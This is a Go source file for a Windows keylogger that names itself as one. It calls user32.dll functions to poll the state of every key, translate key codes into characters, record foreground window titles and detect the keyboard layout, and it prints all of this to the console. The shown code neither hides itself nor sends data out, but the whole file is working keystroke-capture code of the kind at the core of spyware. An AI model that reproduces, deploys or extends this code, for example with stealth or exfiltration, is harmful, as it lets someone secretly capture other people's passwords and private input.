package main

import (
	"fmt"
	"log"
	"math"
	"os"
	"strconv"
	"syscall"
	"time"
	"unsafe"

	"github.com/gios/amigo/constants"
)

var (
	user32                       = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState         = user32.NewProc("GetAsyncKeyState")
	procGetForegroundWindow      = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW           = user32.NewProc("GetWindowTextW")
	procGetKeyboardLayout        = user32.NewProc("GetKeyboardLayout")
	procGetWindowThreadProcessID = user32.NewProc("GetWindowThreadProcessId")

	tmpTitle string
)

var tmpKeylog = make(chan string)
var tmpWindow = make(chan string)

func getForegroundWindow() (hwnd syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)

	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

func getKeyboardLayout(dword syscall.Handle) (hkl syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetKeyboardLayout.Addr(), 1, uintptr(dword), 0, 0)

	if e1 != 0 {
		err = error(e1)
		return
	}
	hkl = syscall.Handle(r0)
	return
}

func getWindowThreadProcessID(hwnd syscall.Handle) (dword syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowThreadProcessID.Addr(), 1, uintptr(hwnd), 0, 0)

	if e1 != 0 {
		err = error(e1)
		return
	}
	dword = syscall.Handle(r0)
	return
}

func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)

	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func windowLogger() {
	for {
		foregroundWindow, getForegroundWindowErr := getForegroundWindow()
		if getForegroundWindowErr != nil {
			log.Fatalf("getForegroundWindow -> %v", getForegroundWindowErr)
		}
		window := make([]uint16, 200)
		getWindowText(foregroundWindow, &window[0], int32(len(window)))

		if syscall.UTF16ToString(window) != "" && tmpTitle != syscall.UTF16ToString(window) {
			tmpTitle = syscall.UTF16ToString(window)
			tmpWindow <- string("[" + syscall.UTF16ToString(window) + "]\r\n")
		}
		time.Sleep(1 * time.Millisecond)
	}
}

func getLanguage() {
	foregroundWindow, getForegroundWindowErr := getForegroundWindow()
	if getForegroundWindowErr != nil {
		log.Fatalf("getForegroundWindow -> %v", getForegroundWindowErr)
	}
	hwnd, getWindowThreadProcessIDErr := getWindowThreadProcessID(foregroundWindow)
	if getWindowThreadProcessIDErr != nil {
		log.Fatalf("getWindowThreadProcessID -> %v", getWindowThreadProcessIDErr)
	}
	hkl, getKeyboardLayoutErr := getKeyboardLayout(hwnd)

	if getKeyboardLayoutErr != nil {
		log.Fatalf("getKeyboardLayout -> %v", getKeyboardLayoutErr)
	}

	languageCode := int64(hkl) & int64(math.Pow(2, 16)-1)
	languageID, languageCodeErr := strconv.Atoi(strconv.FormatInt(languageCode, 16))

	if languageCodeErr != nil {
		log.Fatalf("languageCodeErr -> %v", languageCodeErr)
	}

	switch languageID {
	case 409:
		fmt.Printf("Language: %v \r\n", constants.US)
		break
	case 422:
		fmt.Printf("Language: %v \r\n", constants.UA)
		break
	case 419:
		fmt.Printf("Language: %v \r\n", constants.RU)
		break
	}
}

func keyLogger() {
	for {
		time.Sleep(1 * time.Millisecond)
		for KEY := 0; KEY <= 256; KEY++ {
			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
			if Val&0x1 == 0 {
				continue
			}
			switch KEY {
			case constants.VK_BACK:
				tmpKeylog <- "[Back]"
				break
			case constants.VK_TAB:
				tmpKeylog <- "[Tab]"
				break
			case constants.VK_RETURN:
				tmpKeylog <- "[Enter]\r\n"
				break
			case constants.VK_SHIFT:
				tmpKeylog <- "[Shift]"
				break
			case constants.VK_MENU:
				tmpKeylog <- "[Alt]"
				break
			case constants.VK_CAPITAL:
				tmpKeylog <- "[CapsLock]"
				break
			case constants.VK_ESCAPE:
				tmpKeylog <- "[Esc]"
				break
			case constants.VK_SPACE:
				tmpKeylog <- " "
				break
			case constants.VK_PRIOR:
				tmpKeylog <- "[PageUp]"
				break
			case constants.VK_NEXT:
				tmpKeylog <- "[PageDown]"
				break
			case constants.VK_END:
				tmpKeylog <- "[End]"
				break
			case constants.VK_HOME:
				tmpKeylog <- "[Home]"
				break
			case constants.VK_LEFT:
				tmpKeylog <- "[Left]"
				break
			case constants.VK_UP:
				tmpKeylog <- "[Up]"
				break
			case constants.VK_RIGHT:
				tmpKeylog <- "[Right]"
				break
			case constants.VK_DOWN:
				tmpKeylog <- "[Down]"
				break
			case constants.VK_SELECT:
				tmpKeylog <- "[Select]"
				break
			case constants.VK_PRINT:
				tmpKeylog <- "[Print]"
				break
			case constants.VK_EXECUTE:
				tmpKeylog <- "[Execute]"
				break
			case constants.VK_SNAPSHOT:
				tmpKeylog <- "[PrintScreen]"
				break
			case constants.VK_INSERT:
				tmpKeylog <- "[Insert]"
				break
			case constants.VK_DELETE:
				tmpKeylog <- "[Delete]"
				break
			case constants.VK_HELP:
				tmpKeylog <- "[Help]"
				break
			case constants.VK_LWIN:
				tmpKeylog <- "[LeftWindows]"
				break
			case constants.VK_RWIN:
				tmpKeylog <- "[RightWindows]"
				break
			case constants.VK_APPS:
				tmpKeylog <- "[Applications]"
				break
			case constants.VK_SLEEP:
				tmpKeylog <- "[Sleep]"
				break
			case constants.VK_NUMPAD0:
				tmpKeylog <- "[Pad 0]"
				break
			case constants.VK_NUMPAD1:
				tmpKeylog <- "[Pad 1]"
				break
			case constants.VK_NUMPAD2:
				tmpKeylog <- "[Pad 2]"
				break
			case constants.VK_NUMPAD3:
				tmpKeylog <- "[Pad 3]"
				break
			case constants.VK_NUMPAD4:
				tmpKeylog <- "[Pad 4]"
				break
			case constants.VK_NUMPAD5:
				tmpKeylog <- "[Pad 5]"
				break
			case constants.VK_NUMPAD6:
				tmpKeylog <- "[Pad 6]"
				break
			case constants.VK_NUMPAD7:
				tmpKeylog <- "[Pad 7]"
				break
			case constants.VK_NUMPAD8:
				tmpKeylog <- "[Pad 8]"
				break
			case constants.VK_NUMPAD9:
				tmpKeylog <- "[Pad 9]"
				break
			case constants.VK_MULTIPLY:
				tmpKeylog <- "*"
				break
			case constants.VK_ADD:
				tmpKeylog <- "+"
				break
			case constants.VK_SEPARATOR:
				tmpKeylog <- "[Separator]"
				break
			case constants.VK_SUBTRACT:
				tmpKeylog <- "-"
				break
			case constants.VK_DECIMAL:
				tmpKeylog <- "."
				break
			case constants.VK_DIVIDE:
				tmpKeylog <- "[Devide]"
				break
			case constants.VK_F1:
				tmpKeylog <- "[F1]"
				break
			case constants.VK_F2:
				tmpKeylog <- "[F2]"
				break
			case constants.VK_F3:
				tmpKeylog <- "[F3]"
				break
			case constants.VK_F4:
				tmpKeylog <- "[F4]"
				break
			case constants.VK_F5:
				tmpKeylog <- "[F5]"
				break
			case constants.VK_F6:
				tmpKeylog <- "[F6]"
				break
			case constants.VK_F7:
				tmpKeylog <- "[F7]"
				break
			case constants.VK_F8:
				tmpKeylog <- "[F8]"
				break
			case constants.VK_F9:
				tmpKeylog <- "[F9]"
				break
			case constants.VK_F10:
				tmpKeylog <- "[F10]"
				break
			case constants.VK_F11:
				tmpKeylog <- "[F11]"
				break
			case constants.VK_F12:
				tmpKeylog <- "[F12]"
				break
			case constants.VK_NUMLOCK:
				tmpKeylog <- "[NumLock]"
				break
			case constants.VK_SCROLL:
				tmpKeylog <- "[ScrollLock]"
				break
			case constants.VK_LSHIFT:
				tmpKeylog <- "[LeftShift]"
				break
			case constants.VK_RSHIFT:
				tmpKeylog <- "[RightShift]"
				break
			case constants.VK_LCONTROL:
				tmpKeylog <- "[LeftCtrl]"
				break
			case constants.VK_RCONTROL:
				tmpKeylog <- "[RightCtrl]"
				break
			case constants.VK_LMENU:
				tmpKeylog <- "[LeftMenu]"
				break
			case constants.VK_RMENU:
				tmpKeylog <- "[RightMenu]"
				break
			case constants.VK_OEM_1:
				tmpKeylog <- ";"
				break
			case constants.VK_OEM_2:
				tmpKeylog <- "/"
				break
			case constants.VK_OEM_3:
				tmpKeylog <- "`"
				break
			case constants.VK_OEM_4:
				tmpKeylog <- "["
				break
			case constants.VK_OEM_5:
				tmpKeylog <- "\\"
				break
			case constants.VK_OEM_6:
				tmpKeylog <- "]"
				break
			case constants.VK_OEM_7:
				tmpKeylog <- "'"
				break
			case constants.VK_OEM_PERIOD:
				tmpKeylog <- "."
				break
			case 0x30:
				tmpKeylog <- "0"
				break
			case 0x31:
				tmpKeylog <- "1"
				break
			case 0x32:
				tmpKeylog <- "2"
				break
			case 0x33:
				tmpKeylog <- "3"
				break
			case 0x34:
				tmpKeylog <- "4"
				break
			case 0x35:
				tmpKeylog <- "5"
				break
			case 0x36:
				tmpKeylog <- "6"
				break
			case 0x37:
				tmpKeylog <- "7"
				break
			case 0x38:
				tmpKeylog <- "8"
				break
			case 0x39:
				tmpKeylog <- "9"
				break
			case 0x41:
				getLanguage()
				tmpKeylog <- "a"
				break
			case 0x42:
				getLanguage()
				tmpKeylog <- "b"
				break
			case 0x43:
				getLanguage()
				tmpKeylog <- "c"
				break
			case 0x44:
				getLanguage()
				tmpKeylog <- "d"
				break
			case 0x45:
				getLanguage()
				tmpKeylog <- "e"
				break
			case 0x46:
				getLanguage()
				tmpKeylog <- "f"
				break
			case 0x47:
				getLanguage()
				tmpKeylog <- "g"
				break
			case 0x48:
				getLanguage()
				tmpKeylog <- "h"
				break
			case 0x49:
				getLanguage()
				tmpKeylog <- "i"
				break
			case 0x4A:
				getLanguage()
				tmpKeylog <- "j"
				break
			case 0x4B:
				getLanguage()
				tmpKeylog <- "k"
				break
			case 0x4C:
				getLanguage()
				tmpKeylog <- "l"
				break
			case 0x4D:
				getLanguage()
				tmpKeylog <- "m"
				break
			case 0x4E:
				getLanguage()
				tmpKeylog <- "n"
				break
			case 0x4F:
				getLanguage()
				tmpKeylog <- "o"
				break
			case 0x50:
				getLanguage()
				tmpKeylog <- "p"
				break
			case 0x51:
				getLanguage()
				tmpKeylog <- "q"
				break
			case 0x52:
				getLanguage()
				tmpKeylog <- "r"
				break
			case 0x53:
				getLanguage()
				tmpKeylog <- "s"
				break
			case 0x54:
				getLanguage()
				tmpKeylog <- "t"
				break
			case 0x55:
				getLanguage()
				tmpKeylog <- "u"
				break
			case 0x56:
				getLanguage()
				tmpKeylog <- "v"
				break
			case 0x57:
				getLanguage()
				tmpKeylog <- "w"
				break
			case 0x58:
				getLanguage()
				tmpKeylog <- "x"
				break
			case 0x59:
				getLanguage()
				tmpKeylog <- "y"
				break
			case 0x5A:
				getLanguage()
				tmpKeylog <- "z"
				break
			}
		}
	}
}

func keyLoggerListener() {
	for {
		time.Sleep(1 * time.Millisecond)
		select {
		case key := <-tmpKeylog:
			fmt.Println("KEY: ", key)
		case window := <-tmpWindow:
			fmt.Println("WINDOW: ", window)
		default:
		}
	}
}

func main() {
	fmt.Println("Starting KeyLogger!")
	go keyLogger()
	go windowLogger()
	go keyLoggerListener()
	os.Stdin.Read([]byte{0})
}
